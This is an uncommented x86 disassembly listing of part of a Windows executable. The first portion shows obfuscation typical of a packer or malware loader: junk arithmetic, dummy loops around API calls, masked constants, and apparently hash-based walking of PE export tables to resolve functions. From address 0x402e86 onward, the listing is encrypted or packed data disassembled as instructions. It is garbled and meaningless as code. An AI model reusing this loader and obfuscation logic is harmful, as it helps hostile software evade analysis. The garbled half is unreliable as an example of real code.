  4026ca:	add    al,0xc
  4026cc:	xor    al,0x70
  4026ce:	cmp    al,0x29
  4026d0:	mov    DWORD PTR ds:0x413cf0,0x3ac2
  4026da:	jne    0x402787
  4026e0:	add    edx,DWORD PTR ds:0x41401c
  4026e6:	mov    eax,DWORD PTR [ebp+0x8]
  4026e9:	and    DWORD PTR ds:0x413c84,0x0
  4026f3:	jmp    0x402707
  4026f8:	xor    edx,edx
  4026fa:	xor    edx,DWORD PTR ds:0x413c84
  402700:	inc    edx
  402701:	mov    DWORD PTR ds:0x413c84,edx
  402707:	cmp    DWORD PTR ds:0x413c84,0x12
  40270e:	jae    0x40274b
  402714:	cmp    DWORD PTR ds:0x413c84,0x7
  40271b:	jne    0x40272c
  402721:	push   0x4160b3
  402726:	call   DWORD PTR ds:0x41677c
  40272c:	cmp    DWORD PTR ds:0x413c84,0x6
  402733:	jne    0x402746
  402739:	mov    edx,DWORD PTR ds:0x413c84
  40273f:	inc    edx
  402740:	mov    DWORD PTR ds:0x413c84,edx
  402746:	jmp    0x4026f8
  40274b:	mov    ecx,DWORD PTR [ebp+0x8]
  40274e:	add    ecx,DWORD PTR [eax+0x3c]
  402751:	mov    edx,0x7510894
  402756:	mov    DWORD PTR [ebp+0x8],ecx
  402759:	mov    eax,DWORD PTR [ebp-0x4]
  40275c:	xor    eax,edx
  40275e:	push   esi
  40275f:	mov    esi,DWORD PTR [ebp+0x8]
  402762:	mov    ecx,0x3272dc
  402767:	add    eax,ecx
  402769:	cmp    DWORD PTR [esi+0x54],eax
  40276c:	pop    esi
  40276d:	je     0x40277b
  402773:	mov    eax,DWORD PTR [ebp+0x8]
  402776:	jmp    0x402794
  40277b:	mov    eax,DWORD PTR [ebp-0x4]
  40277e:	xor    eax,edx
  402780:	add    eax,ecx
  402782:	jmp    0x402794
  402787:	mov    eax,DWORD PTR [ebp-0x4]
  40278a:	xor    eax,0x7510894
  40278f:	add    eax,0x3272dc
  402794:	leave  
  402795:	ret    0x4
  402798:	push   ebp
  402799:	mov    ebp,esp
  40279b:	sub    esp,0x78
  40279e:	xor    DWORD PTR ds:0x413c1e,0x50b0
  4027a8:	push   ebx
  4027a9:	adc    DWORD PTR ds:0x413d30,0x7f7d
  4027b3:	push   esi
  4027b4:	add    DWORD PTR ds:0x413d30,0x413cf0
  4027be:	push   edi
  4027bf:	push   0x1f
  4027c1:	and    DWORD PTR ds:0x413bf6,0x413c80
  4027cb:	lea    eax,[ebp-0x78]
  4027ce:	push   eax
  4027cf:	push   0x0
  4027d1:	adc    DWORD PTR ds:0x413d34,0x413c80
  4027db:	call   DWORD PTR ds:0x41676c
  4027e1:	push   0x97898797
  4027e6:	call   DWORD PTR ds:0x416754
  4027ec:	sub    ecx,ecx
  4027ee:	mov    DWORD PTR [ebp-0x4],0xf89c85b0
  4027f5:	xor    DWORD PTR ds:0x414008,0x58a1
  4027ff:	mov    DWORD PTR [ebp-0x14],0xf89c85b1
  402806:	mov    ecx,DWORD PTR [ebp-0x4]
  402809:	mov    ebx,0x7510894
  40280e:	xor    ecx,ebx
  402810:	mov    eax,0x3272dc
  402815:	xor    DWORD PTR ds:0x413c6c,0x3fbb
  40281f:	add    ecx,eax
  402821:	mov    DWORD PTR [ebp-0x1c],ecx
  402824:	sbb    DWORD PTR ds:0x413d34,edi
  40282a:	mov    ecx,DWORD PTR [ebp+0x14]
  40282d:	test   ecx,ecx
  40282f:	je     0x402847
  402835:	mov    ecx,DWORD PTR [ebp+0x14]
  402838:	mov    ecx,DWORD PTR [ecx]
  40283a:	or     DWORD PTR ds:0x413c0a,0x414000
  402844:	mov    DWORD PTR [ebp-0x1c],ecx
  402847:	mov    DWORD PTR ds:0x413d34,0x1f
  402851:	cmp    DWORD PTR ds:0x413d34,0x0
  402858:	je     0x40288f
  40285e:	cmp    DWORD PTR ds:0x413d34,0x22
  402865:	jne    0x40287d
  40286b:	push   0x414010
  402870:	push   0x0
  402872:	push   0x416017
  402877:	call   DWORD PTR ds:0x416780
  40287d:	mov    ecx,DWORD PTR ds:0x413d34
  402883:	dec    ecx
  402884:	mov    DWORD PTR ds:0x413d34,ecx
  40288a:	jmp    0x402851
  40288f:	mov    ecx,0x7665
  402894:	sbb    edi,edi
  402896:	imul   edx,eax
  402899:	and    DWORD PTR ds:0x413c80,0x0
  4028a3:	mov    esi,DWORD PTR ds:0x413c80
  4028a9:	inc    esi
  4028aa:	mov    DWORD PTR ds:0x413c80,esi
  4028b0:	cmp    DWORD PTR ds:0x413c80,0xc
  4028b7:	jne    0x4028cb
  4028bd:	push   0x413ce4
  4028c2:	push   DWORD PTR [ebp-0x20]
  4028c5:	call   DWORD PTR ds:0x416784
  4028cb:	cmp    DWORD PTR ds:0x413c80,0xb
  4028d2:	jne    0x4028e5
  4028d8:	mov    esi,DWORD PTR ds:0x413c80
  4028de:	inc    esi
  4028df:	mov    DWORD PTR ds:0x413c80,esi
  4028e5:	cmp    DWORD PTR ds:0x413c80,0x1c
  4028ec:	jb     0x4028a3
  4028f2:	mov    esi,0x76532
  4028f7:	mov    DWORD PTR ds:0x413d30,0x639a
  402901:	add    edx,ecx
  402903:	movzx  edi,BYTE PTR ds:0x413ce4
  40290a:	and    DWORD PTR ds:0x413bfe,edi
  402910:	xchg   esi,ecx
  402912:	sbb    DWORD PTR ds:0x413c80,edi
  402918:	mov    edi,0x54354
  40291d:	mov    DWORD PTR ds:0x413d34,0x5e6f
  402927:	sub    edx,edi
  402929:	mov    ecx,DWORD PTR [ebp-0x4]
  40292c:	xor    ecx,ebx
  40292e:	mov    DWORD PTR ds:0x413c70,0x13
  402938:	cmp    DWORD PTR ds:0x413c70,0x0
  40293f:	je     0x40299c
  402945:	cmp    DWORD PTR ds:0x413c70,0x5
  40294c:	jne    0x402962
  402952:	push   0x7f69
  402957:	push   0x41606e
  40295c:	call   DWORD PTR ds:0x41678c
  402962:	cmp    DWORD PTR ds:0x413c70,0x6
  402969:	jne    0x40297c
  40296f:	mov    esi,DWORD PTR ds:0x413c70
  402975:	dec    esi
  402976:	mov    DWORD PTR ds:0x413c70,esi
  40297c:	mov    esi,DWORD PTR ds:0x413c70
  402982:	dec    esi
  402983:	mov    DWORD PTR ds:0x413c70,esi
  402989:	jmp    0x402938
  40298e:	mov    esi,DWORD PTR ds:0x413cb0
  402994:	mov    esi,DWORD PTR [esi]
  402996:	adc    DWORD PTR ds:0x414008,esi
  40299c:	add    ecx,eax
  40299e:	mov    DWORD PTR [ebp-0x8],ecx
  4029a1:	sub    ecx,ecx
  4029a3:	mov    ecx,DWORD PTR [ebp-0x14]
  4029a6:	sub    DWORD PTR ds:0x413c80,ebx
  4029ac:	xor    ecx,ebx
  4029ae:	add    ecx,eax
  4029b0:	mov    DWORD PTR [ebp-0x24],ecx
  4029b3:	sub    ecx,0x1ce
  4029b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4029bc:	mov    esi,DWORD PTR ds:0x413c1a
  4029c2:	xor    DWORD PTR ds:0x413d1c,esi
  4029c8:	xor    ecx,ebx
  4029ca:	add    ecx,eax
  4029cc:	add    DWORD PTR ds:0x413d34,edi
  4029d2:	mov    DWORD PTR [ebp-0x30],ecx
  4029d5:	movzx  esi,BYTE PTR ds:0x414010
  4029dc:	sbb    esi,DWORD PTR ds:0x413bfe
  4029e2:	mov    DWORD PTR ds:0x414010,esi
  4029e8:	mov    esi,DWORD PTR [ebp-0x4]
  4029eb:	adc    ecx,DWORD PTR ds:0x413c16
  4029f1:	xor    esi,ebx
  4029f3:	xor    DWORD PTR ds:0x41401c,ecx
  4029f9:	add    esi,eax
  4029fb:	and    DWORD PTR ds:0x413c84,0x0
  402a05:	jmp    0x402a17
  402a0a:	mov    ecx,DWORD PTR ds:0x413c84
  402a10:	inc    ecx
  402a11:	mov    DWORD PTR ds:0x413c84,ecx
  402a17:	cmp    DWORD PTR ds:0x413c84,0x19
  402a1e:	jae    0x402af3
  402a24:	cmp    DWORD PTR ds:0x413c84,0xd
  402a2b:	jne    0x402a51
  402a31:	push   0x7c39
  402a36:	push   0x413c1e
  402a3b:	push   0x8717
  402a40:	push   0x416025
  402a45:	push   DWORD PTR [ebp-0x28]
  402a48:	push   DWORD PTR [ebp-0x10]
  402a4b:	call   DWORD PTR ds:0x416790
  402a51:	cmp    DWORD PTR ds:0x413c84,0xc
  402a58:	jne    0x402a6b
  402a5e:	mov    ecx,DWORD PTR ds:0x413c84
  402a64:	inc    ecx
  402a65:	mov    DWORD PTR ds:0x413c84,ecx
  402a6b:	jmp    0x402a0a
  402a70:	mov    DWORD PTR ds:0x413d30,0x12
  402a7a:	cmp    DWORD PTR ds:0x413d30,0x0
  402a81:	je     0x402af3
  402a87:	cmp    DWORD PTR ds:0x413d30,0x21
  402a8e:	jne    0x402a9f
  402a94:	push   0x1529
  402a99:	call   DWORD PTR ds:0x416798
  402a9f:	mov    ecx,DWORD PTR ds:0x413d30
  402aa5:	dec    ecx
  402aa6:	mov    DWORD PTR ds:0x413d30,ecx
  402aac:	jmp    0x402a7a
  402ab1:	and    DWORD PTR ds:0x413d34,0x0
  402abb:	mov    ecx,DWORD PTR ds:0x413d34
  402ac1:	inc    ecx
  402ac2:	mov    DWORD PTR ds:0x413d34,ecx
  402ac8:	cmp    DWORD PTR ds:0x413d34,0x29
  402acf:	jne    0x402ae0
  402ad5:	push   0x413c12
  402ada:	call   DWORD PTR ds:0x41679c
  402ae0:	cmp    DWORD PTR ds:0x413d34,0x19
  402ae7:	jb     0x402abb
  402aed:	or     ecx,DWORD PTR ds:0x413c0a
  402af3:	mov    ecx,DWORD PTR [ebp-0x24]
  402af6:	or     DWORD PTR ds:0x413c88,0x413c12
  402b00:	sub    ecx,eax
  402b02:	add    DWORD PTR ds:0x413c1e,0x57cd
  402b0c:	lea    edx,[esi-0x3272dc]
  402b12:	xor    ecx,ebx
  402b14:	and    DWORD PTR ds:0x413ce8,0xb77
  402b1e:	xor    edx,ebx
  402b20:	mov    DWORD PTR ds:0x413bfe,0x29ac
  402b2a:	cmp    edx,ecx
  402b2c:	mov    DWORD PTR ds:0x413ce4,0x2b4b
  402b36:	je     0x402e02
  402b3c:	sub    ecx,DWORD PTR ds:0x413d34
  402b42:	mov    ecx,DWORD PTR [ebp-0x4]
  402b45:	xor    DWORD PTR ds:0x413bfe,0x413c84
  402b4f:	xor    ecx,ebx
  402b51:	adc    DWORD PTR ds:0x413bf6,0x7b2
  402b5b:	add    ecx,eax
  402b5d:	cmp    esi,ecx
  402b5f:	jne    0x402ddf
  402b65:	or     DWORD PTR ds:0x413cf0,0x413c1e
  402b6f:	push   DWORD PTR [ebp+0x8]
  402b72:	call   0x4026a6
  402b77:	mov    DWORD PTR ds:0x414004,0x1c
  402b81:	cmp    DWORD PTR ds:0x414004,0x0
  402b88:	je     0x402bc3
  402b8e:	cmp    DWORD PTR ds:0x414004,0x2b
  402b95:	jne    0x402ba9
  402b9b:	push   0x413c6c
  402ba0:	push   DWORD PTR [ebp-0x24]
  402ba3:	call   DWORD PTR ds:0x41675c
  402ba9:	xor    ecx,ecx
  402bab:	or     ecx,DWORD PTR ds:0x414004
  402bb1:	dec    ecx
  402bb2:	mov    DWORD PTR ds:0x414004,ecx
  402bb8:	jmp    0x402b81
  402bbd:	sbb    DWORD PTR ds:0x413d34,ecx
  402bc3:	mov    DWORD PTR [ebp-0x18],eax
  402bc6:	and    DWORD PTR ds:0x413d28,0x0
  402bd0:	jmp    0x402be2
  402bd5:	mov    ecx,DWORD PTR ds:0x413d28
  402bdb:	inc    ecx
  402bdc:	mov    DWORD PTR ds:0x413d28,ecx
  402be2:	cmp    DWORD PTR ds:0x413d28,0x16
  402be9:	jae    0x402c2e
  402bef:	cmp    DWORD PTR ds:0x413d28,0x5
  402bf6:	jne    0x402c0f
  402bfc:	push   DWORD PTR [ebp-0x10]
  402bff:	push   0x41400c
  402c04:	push   0x2409
  402c09:	call   DWORD PTR ds:0x416760
  402c0f:	cmp    DWORD PTR ds:0x413d28,0x4
  402c16:	jne    0x402c29
  402c1c:	mov    ecx,DWORD PTR ds:0x413d28
  402c22:	inc    ecx
  402c23:	mov    DWORD PTR ds:0x413d28,ecx
  402c29:	jmp    0x402bd5
  402c2e:	mov    eax,DWORD PTR [ebp-0x4]
  402c31:	sub    DWORD PTR ds:0x413ce4,0x168d
  402c3b:	mov    ecx,DWORD PTR [ebp-0x18]
  402c3e:	inc    edi
  402c3f:	xor    eax,ebx
  402c41:	and    DWORD PTR ds:0x413c88,0x0
  402c4b:	jmp    0x402c5d
  402c50:	mov    edi,DWORD PTR ds:0x413c88
  402c56:	inc    edi
  402c57:	mov    DWORD PTR ds:0x413c88,edi
  402c5d:	cmp    DWORD PTR ds:0x413c88,0x1c
  402c64:	jae    0x402ca8
  402c6a:	cmp    DWORD PTR ds:0x413c88,0x5
  402c71:	jne    0x402c89
  402c77:	push   DWORD PTR [ebp-0xc]
  402c7a:	push   DWORD PTR [ebp-0x10]
  402c7d:	push   DWORD PTR [ebp-0x28]
  402c80:	push   DWORD PTR [ebp-0xc]
  402c83:	call   DWORD PTR ds:0x416764
  402c89:	cmp    DWORD PTR ds:0x413c88,0x4
  402c90:	jne    0x402ca3
  402c96:	mov    edi,DWORD PTR ds:0x413c88
  402c9c:	inc    edi
  402c9d:	mov    DWORD PTR ds:0x413c88,edi
  402ca3:	jmp    0x402c50
  402ca8:	mov    edi,0x3272dc
  402cad:	sbb    DWORD PTR ds:0x414008,0x338e
  402cb7:	add    eax,edi
  402cb9:	cmp    ecx,eax
  402cbb:	mov    DWORD PTR ds:0x413bfe,0x2c9f
  402cc5:	je     0x402e72
  402ccb:	adc    DWORD PTR ds:0x413c74,0x2cc9
  402cd5:	push   DWORD PTR [ebp-0x18]
  402cd8:	add    DWORD PTR ds:0x413c74,0x6616
  402ce2:	push   DWORD PTR [ebp+0x8]
  402ce5:	neg    DWORD PTR ds:0x413d2c
  402ceb:	call   0x407cf9
  402cf0:	mov    DWORD PTR [ebp-0x18],eax
  402cf3:	xor    DWORD PTR ds:0x413c12,ebx
  402cf9:	mov    eax,DWORD PTR [ebp-0x4]
  402cfc:	add    DWORD PTR ds:0x414008,edx
  402d02:	mov    ecx,DWORD PTR [ebp-0x18]
  402d05:	sub    DWORD PTR ds:0x413cdc,0x28ac
  402d0f:	xor    eax,ebx
  402d11:	sub    DWORD PTR ds:0x41400c,0x413ce4
  402d1b:	add    eax,edi
  402d1d:	cmp    ecx,eax
  402d1f:	je     0x402e72
  402d25:	or     DWORD PTR ds:0x414014,edi
  402d2b:	mov    eax,DWORD PTR [ebp-0x18]
  402d2e:	mov    ecx,DWORD PTR ds:0x414008
  402d34:	adc    ecx,DWORD PTR ds:0x413c7c
  402d3a:	mov    DWORD PTR ds:0x414008,ecx
  402d40:	mov    eax,DWORD PTR [eax+0x18]
  402d43:	mov    ecx,DWORD PTR ds:0x413ca4
  402d49:	mov    ecx,DWORD PTR [ecx]
  402d4b:	and    DWORD PTR ds:0x413d28,ecx
  402d51:	mov    DWORD PTR [ebp-0x24],eax
  402d54:	and    DWORD PTR ds:0x413c70,0x0
  402d5e:	mov    ecx,DWORD PTR ds:0x413c70
  402d64:	inc    ecx
  402d65:	mov    DWORD PTR ds:0x413c70,ecx
  402d6b:	cmp    DWORD PTR ds:0x413c70,0xf
  402d72:	jne    0x402d8d
  402d78:	push   0x2d13
  402d7d:	push   0x29b5
  402d82:	push   0x400000
  402d87:	call   DWORD PTR ds:0x416768
  402d8d:	cmp    DWORD PTR ds:0x413c70,0xe
  402d94:	jne    0x402da7
  402d9a:	mov    ecx,DWORD PTR ds:0x413c70
  402da0:	inc    ecx
  402da1:	mov    DWORD PTR ds:0x413c70,ecx
  402da7:	cmp    DWORD PTR ds:0x413c70,0x18
  402dae:	jb     0x402d5e
  402db4:	mov    eax,DWORD PTR [ebp-0x18]
  402db7:	mov    ecx,DWORD PTR [ebp+0x8]
  402dba:	add    ecx,DWORD PTR [eax+0x20]
  402dbd:	mov    DWORD PTR [ebp-0x2c],ecx
  402dc0:	mov    eax,DWORD PTR [ebp-0x18]
  402dc3:	mov    ecx,DWORD PTR [ebp+0x8]
  402dc6:	add    ecx,DWORD PTR [eax+0x24]
  402dc9:	mov    DWORD PTR [ebp-0x34],ecx
  402dcc:	mov    eax,DWORD PTR [ebp-0x18]
  402dcf:	mov    ecx,DWORD PTR [ebp+0x8]
  402dd2:	add    ecx,DWORD PTR [eax+0x1c]
  402dd5:	mov    eax,edi
  402dd7:	mov    DWORD PTR [ebp-0x18],ecx
  402dda:	jmp    0x402e3a
  402ddf:	mov    ecx,DWORD PTR [ebp-0x2c]
  402de2:	mov    edx,DWORD PTR [ebp+0x8]
  402de5:	add    edx,DWORD PTR [ecx+esi*4]
  402de8:	mov    DWORD PTR [ebp-0x28],edx
  402deb:	mov    ecx,DWORD PTR [ebp-0x4]
  402dee:	mov    edx,DWORD PTR [ebp-0x28]
  402df1:	xor    ecx,ebx
  402df3:	add    ecx,eax
  402df5:	cmp    edx,ecx
  402df7:	je     0x402e3a
  402dfd:	jmp    0x402e26
  402e02:	mov    ecx,DWORD PTR [ebp-0x4]
  402e05:	mov    edx,DWORD PTR [ebp-0x8]
  402e08:	xor    ecx,ebx
  402e0a:	add    ecx,eax
  402e0c:	cmp    edx,ecx
  402e0e:	je     0x402e7e
  402e14:	mov    ecx,DWORD PTR [ebp-0x4]
  402e17:	mov    edx,DWORD PTR [ebp-0x30]
  402e1a:	xor    ecx,ebx
  402e1c:	add    ecx,eax
  402e1e:	cmp    edx,ecx
  402e20:	je     0x40522e
  402e26:	lea    eax,[ebp-0x8]
  402e29:	push   eax
  402e2a:	push   DWORD PTR [ebp-0x28]
  402e2d:	push   DWORD PTR [ebp+0xc]
  402e30:	call   0x40a47a
  402e35:	mov    eax,0x3272dc
  402e3a:	mov    ecx,DWORD PTR [ebp-0x4]
  402e3d:	mov    edx,DWORD PTR [ebp-0x8]
  402e40:	xor    ecx,ebx
  402e42:	add    ecx,eax
  402e44:	cmp    edx,ecx
  402e46:	je     0x402e61
  402e4c:	mov    ecx,DWORD PTR [ebp-0x34]
  402e4f:	movzx  ecx,WORD PTR [ecx+esi*2]
  402e53:	mov    edx,DWORD PTR [ebp-0x18]
  402e56:	mov    ecx,DWORD PTR [edx+ecx*4]
  402e59:	mov    DWORD PTR [ebp-0x38],ecx
  402e5c:	jmp    0x402e02
  402e61:	mov    ecx,DWORD PTR [ebp-0x14]
  402e64:	xor    ecx,ebx
  402e66:	lea    esi,[esi+ecx*1+0x3272dc]
  402e6d:	jmp    0x4029fb
  402e72:	mov    eax,DWORD PTR [ebp-0x4]
  402e75:	xor    eax,ebx
  402e77:	add    eax,edi
  402e79:	jmp    0x405392
  402e7e:	mov    eax,DWORD PTR [ebp-0x4]
  402e81:	jmp    0x405222
  402e86:	or     al,0xe7
  402e88:	xchg   BYTE PTR [ebx-0x240e7489],cl
  402e8e:	xchg   bl,cl
  402e90:	pushf  
  402e91:	cmp    DWORD PTR [edx],esi
  402e93:	push   es
  402e94:	les    ecx,FWORD PTR [esi+0x7c]
  402e97:	jl     0x402f15
  402e99:	jl     0x402e7b
  402e9b:	pop    edi
  402e9c:	jl     0x402f1a
  402e9e:	adc    eax,0x1921172e
  402ea3:	and    eax,0x38652f1b
  402ea8:	imul   ebp,DWORD PTR [eax+0x6],0x6d6c6c62
  402eaf:	xor    al,0xc5
  402eb1:	fsubrp st(1),st
  402eb3:	push   edx
  402eb4:	dec    edx
  402eb5:	imul   esp,DWORD PTR [ecx+0x5b],0xffffff92
  402eb9:	bound  ebp,QWORD PTR [ebp+0x59]
  402ebc:	iret   
  402ebd:	pop    ebp
  402ebe:	dec    esp
  402ebf:	and    cl,BYTE PTR [esi+0x577887fc]
  402ec5:	dec    ebp
  402ec6:	jg     0x402eff
  402ec8:	jb     0x402e72
  402eca:	jg     0x402e6e
  402ecc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ecd:	cmp    ebp,DWORD PTR [esi]
  402ecf:	jmp    FWORD PTR [eax-0x22]
  402ed2:	cld    
  402ed3:	push   ebx
  402ed4:	jg     0x402ed6
  402ed6:	in     eax,dx
  402ed7:	cmp    ebp,ecx
  402ed9:	mov    esp,0xc01387ed
  402ede:	mov    ebp,DWORD PTR [ecx]
  402ee0:	mulps  xmm5,XMMWORD PTR [ebx+0x6df7c68c]
  402ee7:	fld    QWORD PTR [esi]
  402ee9:	(bad)  
  402eea:	lock cld 
  402eec:	sub    BYTE PTR [edx],bl
  402eee:	dec    edx
  402eef:	push   cs
  402ef0:	sub    BYTE PTR [ebx+0x6a],ch
  402ef3:	mov    ecx,0x54113af
  402ef8:	test   al,0xff
  402efa:	jmp    0x34b65a48
  402eff:	retf   0xf95b
  402f02:	sbb    al,0xfc
  402f04:	jp     0x402ea7
  402f06:	arpl   bp,bx
  402f08:	call   0x8416:0x7a18b5f
  402f0f:	xor    ebx,esi
  402f11:	cmp    BYTE PTR [esi],0x74
  402f14:	jae    0x402f21
  402f16:	fsubr  QWORD PTR ds:0x33368d54
  402f1c:	push   esi
  402f1d:	jecxz  0x402eee
  402f1f:	mov    WORD PTR [ecx],gs
  402f21:	mov    DWORD PTR [edx+0x518aceb7],esi
  402f27:	out    0x45,al
  402f29:	push   esp
  402f2a:	dec    esi
  402f2b:	push   cs
  402f2c:	and    bl,dh
  402f2e:	cmp    BYTE PTR [ebx],al
  402f30:	lods   eax,DWORD PTR ds:[esi]
  402f31:	dec    ebx
  402f32:	int3   
  402f33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f34:	xor    al,dl
  402f36:	push   es
  402f37:	pop    eax
  402f38:	std    
  402f39:	push   esp
  402f3a:	pop    eax
  402f3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f3c:	stc    
  402f3d:	push   0xffffffbf
  402f3f:	cli    
  402f40:	inc    esp
  402f41:	adc    eax,0x24fb0839
  402f46:	test   al,0xda
  402f48:	iret   
  402f49:	sahf   
  402f4a:	paddw  mm4,mm5
  402f4d:	fnstcw WORD PTR ds:0x7023ad81
  402f53:	(bad)  
  402f55:	pop    ss
  402f56:	sbb    DWORD PTR [esi+0x1003e2b5],0x672abbb6
  402f60:	xchg   esp,eax
  402f61:	in     al,dx
  402f62:	popa   
  402f63:	retf   0xd3ec
  402f66:	sahf   
  402f67:	ja     0x402f85
  402f69:	jg     0x402f67
  402f6b:	into   
  402f6c:	push   esp
  402f6d:	xor    eax,0x4a849bd9
  402f72:	push   0x8d0fab4c
  402f77:	stos   DWORD PTR es:[edi],eax
  402f78:	out    0x85,al
  402f7a:	cdq    
  402f7b:	fdivr  QWORD PTR [ebp-0x1ad751dd]
  402f81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f82:	int3   
  402f83:	pop    ebx
  402f84:	or     esp,DWORD PTR [ebp+0x264d2598]
  402f8a:	xor    DWORD PTR [edi-0x3675d1dd],0xffffff8f
  402f91:	jnp    0x402ff2
  402f93:	sub    al,0xf1
  402f95:	test   DWORD PTR [esi+0x10],esi
  402f98:	xor    ebp,DWORD PTR [edx+0x22a8f5b2]
  402f9e:	jb     0x402f3d
  402fa0:	dec    edx
  402fa1:	add    BYTE PTR [ebx+0x765a378e],cl
  402fa7:	mov    ebp,edi
  402fa9:	mov    dl,0x3a
  402fab:	jo     0x402fb2
  402fad:	test   BYTE PTR [ebx],dh
  402faf:	aaa    
  402fb0:	jmp    0x403017
  402fb2:	sbb    BYTE PTR [ebx+0x23],ch
  402fb5:	xor    ah,BYTE PTR [ebx-0x32c05b77]
  402fbb:	and    al,0xc1
  402fbd:	out    0x62,al
  402fbf:	mov    eax,DWORD PTR [ebx+ebx*1]
  402fc2:	leave  
  402fc3:	sub    dh,ah
  402fc5:	xlat   BYTE PTR ds:[ebx]
  402fc6:	push   edi
  402fc7:	lds    esp,FWORD PTR [eax+0x53]
  402fca:	xchg   ecx,eax
  402fcb:	inc    edx
  402fcc:	sahf   
  402fcd:	mov    cl,0xd6
  402fcf:	mov    ch,0xe5
  402fd1:	nop
  402fd2:	loop   0x40304a
  402fd4:	mov    cl,0xc0
  402fd6:	scas   eax,DWORD PTR es:[edi]
  402fd7:	ret    
  402fd8:	jmp    0xd6ce4238
  402fdd:	ss xchg ecx,eax
  402fdf:	(bad)  
  402fe1:	mov    ebx,0xa3b75d2b
  402fe6:	test   eax,0x7b2caf6a
  402feb:	call   0x48a5:0x2ab85f26
  402ff2:	les    eax,FWORD PTR [ecx-0x25195320]
  402ff8:	rcr    DWORD PTR [ebp-0x1b],0x49
  402ffc:	sbb    al,BYTE PTR [edi]
  402ffe:	inc    edi
  402fff:	popf   
  403000:	nop
  403001:	mov    bh,0x69
  403003:	das    
  403004:	inc    ebp
  403005:	test   al,0x95
  403007:	mov    eax,0x4c663949
  40300c:	stos   BYTE PTR es:[edi],al
  40300d:	test   al,0x4e
  40300f:	outs   dx,BYTE PTR ds:[esi]
  403010:	loopne 0x402fb7
  403012:	(bad)  
  403013:	repz icebp 
  403015:	les    edi,FWORD PTR [edx-0x1b02ba6a]
  40301b:	out    dx,al
  40301c:	ret    
  40301d:	mov    cl,0x2b
  40301f:	(bad)  
  403020:	in     al,dx
  403021:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403022:	nop
  403023:	cmp    eax,0x1296de79
  403028:	jb     0x402fb0
  40302a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40302b:	sti    
  40302c:	or     bl,0x25
  40302f:	cdq    
  403030:	inc    eax
  403031:	mov    ecx,0x64140765
  403036:	dec    edi
  403037:	clc    
  403038:	call   0xbf5bd1d8
  40303d:	stc    
  40303e:	mov    dh,0x22
  403040:	push   DWORD PTR [ebp+edx*1-0x4]
  403044:	push   0xffffff8a
  403046:	cmp    al,0xa6
  403048:	add    al,0xa2
  40304a:	inc    edi
  40304b:	cmp    al,0xad
  40304d:	loopne 0x403045
  40304f:	retf   
  403050:	sbb    DWORD PTR [ecx],ebp
  403052:	repz test DWORD PTR [ebx+esi*1-0x7c40062a],edx
  40305a:	mov    bh,al
  40305c:	ror    DWORD PTR [esi-0x3ad8f564],cl
  403062:	sar    BYTE PTR [ecx+ebx*1-0x6f1f9de3],1
  403069:	inc    edi
  40306a:	and    BYTE PTR ss:[edi-0x42],ch
  40306e:	shl    BYTE PTR [ebx+esi*8-0x694d892c],cl
  403075:	sub    dl,BYTE PTR [eax-0x59]
  403078:	jg     0x4030dd
  40307a:	icebp  
  40307b:	lds    ecx,FWORD PTR [esi-0x42]
  40307e:	cmp    ch,dh
  403080:	loope  0x403002
  403082:	bound  edi,QWORD PTR [edi-0x6c]
  403085:	out    dx,eax
  403086:	cmp    DWORD PTR ds:0x784e257d,0x65bc126
  403090:	pop    ebx
  403091:	gs inc edx
  403093:	inc    ebx
  403094:	lds    edx,FWORD PTR [edx+0x6b]
  403097:	sub    eax,0x57637f64
  40309c:	test   esp,ebp
  40309e:	jne    0x40310a
  4030a0:	push   esp
  4030a1:	call   0xda7769de
  4030a6:	xchg   BYTE PTR [edx+0x1e],al
  4030a9:	jnp    0x403082
  4030ab:	leave  
  4030ac:	sbb    DWORD PTR [ebx+0x71],eax
  4030af:	xchg   BYTE PTR [edx],bl
  4030b1:	push   cs
  4030b2:	sbb    DWORD PTR [ecx-0x102295ec],eax
  4030b8:	mov    esp,0x9e3e1e5e
  4030bd:	pop    eax
  4030be:	test   ecx,0x4b0c1fca
  4030c4:	outs   dx,DWORD PTR ds:[esi]
  4030c5:	jnp    0x4030d1
  4030c7:	fcomp  QWORD PTR [ebx-0x358c47b3]
  4030cd:	ins    DWORD PTR es:[edi],dx
  4030ce:	rol    DWORD PTR [ebp+0x627fea5e],1
  4030d4:	mov    al,ds:0x1798d3dd
  4030d9:	adc    edi,eax
  4030db:	outs   dx,BYTE PTR ds:[esi]
  4030dc:	mov    BYTE PTR [edi-0x41],0x92
  4030e0:	cmc    
  4030e1:	cmc    
  4030e2:	dec    edi
  4030e3:	pushf  
  4030e4:	mov    eax,DWORD PTR [ecx-0x4ff4c63c]
  4030ea:	push   cs
  4030eb:	mov    ah,0xba
  4030ed:	test   ah,cl
  4030ef:	jge    0x403143
  4030f1:	or     DWORD PTR [edi+edi*2],ebp
  4030f4:	xchg   DWORD PTR [edi+eax*4],ecx
  4030f7:	sahf   
  4030f8:	pop    ds
  4030f9:	dec    esi
  4030fa:	std    
  4030fb:	retf   
  4030fc:	lea    ecx,[edx-0x76]
  4030ff:	enter  0xd2be,0x8
  403103:	cld    
  403104:	sub    ecx,DWORD PTR [esi+0xa]
  403107:	aas    
  403108:	clc    
  403109:	ja     0x4030bc
  40310b:	adc    al,0x37
  40310d:	shl    dl,1
  40310f:	dec    edx
  403110:	or     esi,DWORD PTR [esp+ebx*1+0x365a7d92]
  403117:	xchg   bh,bl
  403119:	test   al,0x8a
  40311b:	push   esp
  40311c:	(bad)  
  40311d:	test   al,0x52
  40311f:	call   0x1004608a
  403124:	push   edx
  403125:	mov    bl,0x4b
  403127:	bound  ecx,QWORD PTR [ebx-0x12]
  40312a:	or     al,0x57
  40312c:	loop   0x403167
  40312e:	sti    
  40312f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403130:	mov    esp,DWORD PTR [ebx-0x61]
  403133:	mov    BYTE PTR [edi],dl
  403135:	xchg   DWORD PTR [ebp+0x7f],esp
  403138:	xor    al,0xb1
  40313a:	dec    esp
  40313b:	pop    ds
  40313c:	mov    ecx,0x26a7c63
  403141:	sub    ebp,ebx
  403143:	out    dx,al
  403144:	repnz fdiv DWORD PTR [ecx]
  403147:	cli    
  403148:	leave  
  403149:	jmp    0x40317b
